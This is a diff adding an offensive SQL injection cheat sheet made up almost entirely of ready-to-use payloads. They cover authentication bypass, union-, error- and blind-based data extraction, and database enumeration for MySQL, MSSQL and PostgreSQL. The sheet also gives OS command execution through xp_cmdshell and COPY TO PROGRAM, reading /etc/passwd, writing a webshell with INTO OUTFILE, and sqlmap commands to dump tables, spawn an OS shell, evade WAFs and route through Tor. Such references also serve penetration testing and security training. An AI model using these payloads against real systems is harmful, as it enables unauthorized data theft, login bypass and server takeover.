@@ -1,0 +1,114 @@
+SQL INJECTION CHEATSHEET
+
+OVERVIEW
+SQL Injection occurs when user input is inserted directly into a SQL query without sanitization.
+Goal: extract data, bypass auth, write files, execute OS commands.
+Types: Classic (error-based), Blind (boolean/time-based), Union-based, Out-of-band.
+
+DETECTION
+Basic test payloads (insert in any input field or URL param):
+'
+''
+`
+')
+"))
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+' OR 'x'='x
+1; SELECT SLEEP(5)--
+Signs of vulnerability: SQL error messages, different page behavior, time delay.
+
+AUTH BYPASS PAYLOADS
+Username field: admin'--
+Username field: admin'#
+Username field: ' OR 1=1--
+Username field: ' OR '1'='1'--
+Password field: anything (ignored due to comment)
+Login query becomes: SELECT * FROM users WHERE username='admin'--' AND password='...'
+
+UNION-BASED INJECTION
+Step 1: Find number of columns
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- (increment until error, then n-1 is the count)
+
+Step 2: Find printable columns
+' UNION SELECT NULL,NULL,NULL--
+Replace NULL with 1,2,3 to find which columns display on page
+
+Step 3: Extract data
+' UNION SELECT username,password,NULL FROM users--
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
+
+ERROR-BASED INJECTION (MySQL)
+Extract database: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+Extract version: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+Extract tables: ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--
+
+BLIND BOOLEAN-BASED INJECTION
+True condition (page loads normal): ' AND 1=1--
+False condition (page changes): ' AND 1=2--
+Extract data char by char:
+' AND SUBSTRING((SELECT database()),1,1)='a'--
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>97--
+
+BLIND TIME-BASED INJECTION (MySQL)
+' AND SLEEP(5)--
+' AND IF(1=1,SLEEP(5),0)--
+' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
+
+DATABASE ENUMERATION (MySQL)
+Current database: SELECT database()
+All databases: SELECT schema_name FROM information_schema.schemata
+Tables in DB: SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+Columns in table: SELECT column_name FROM information_schema.columns WHERE table_name='users'
+Current user: SELECT user()
+All users: SELECT user,password FROM mysql.user
+
+DATABASE ENUMERATION (MSSQL)
+Current database: SELECT DB_NAME()
+All databases: SELECT name FROM master.dbo.sysdatabases
+Tables: SELECT name FROM sysobjects WHERE xtype='U'
+Current user: SELECT SYSTEM_USER
+OS command (xp_cmdshell): EXEC xp_cmdshell 'whoami'
+Enable xp_cmdshell: EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+
+DATABASE ENUMERATION (PostgreSQL)
+Current database: SELECT current_database()
+All databases: SELECT datname FROM pg_database
+Tables: SELECT tablename FROM pg_tables WHERE schemaname='public'
+OS command: COPY (SELECT '') TO PROGRAM 'command'
+Read file: COPY test FROM '/etc/passwd'
+
+FILE READ/WRITE (MySQL, needs FILE privilege)
+Read file: ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
+Write webshell: ' UNION SELECT '' INTO OUTFILE '/var/www/html/shell.php'--
+
+SQLMAP (automated SQLi tool)
+Basic test: sqlmap -u "http://target.com/page?id=1"
+POST request: sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
+With cookies: sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"
+List databases: sqlmap -u "URL" --dbs
+List tables: sqlmap -u "URL" -D dbname --tables
+Dump table: sqlmap -u "URL" -D dbname -T tablename --dump
+Get shell: sqlmap -u "URL" --os-shell
+Bypass WAF: sqlmap -u "URL" --tamper=space2comment,between
+Tor anonymity: sqlmap -u "URL" --tor --tor-type=SOCKS5
+Level/risk: sqlmap -u "URL" --level=5 --risk=3
+Batch mode: sqlmap -u "URL" --batch
+
+COMMON BYPASS TECHNIQUES
+Comment variations: --, #, /**/, /*!
+Space bypass: /**/,+,%20,%09,/*comment*/
+Case bypass: SeLeCt, sElEcT
+String concat (MySQL): CONCAT(0x61,0x64,0x6d,0x69,0x6e) = 'admin'
+Hex encoding: 0x61646d696e = 'admin'
+URL encoding: %27 = ', %20 = space
+Double URL encoding: %2527 = '
+
+SECOND ORDER INJECTION
+Malicious input stored in DB, executed later when retrieved and used in another query.
+Test by registering username: admin'--
+Then check if profile pages or features behave differently.
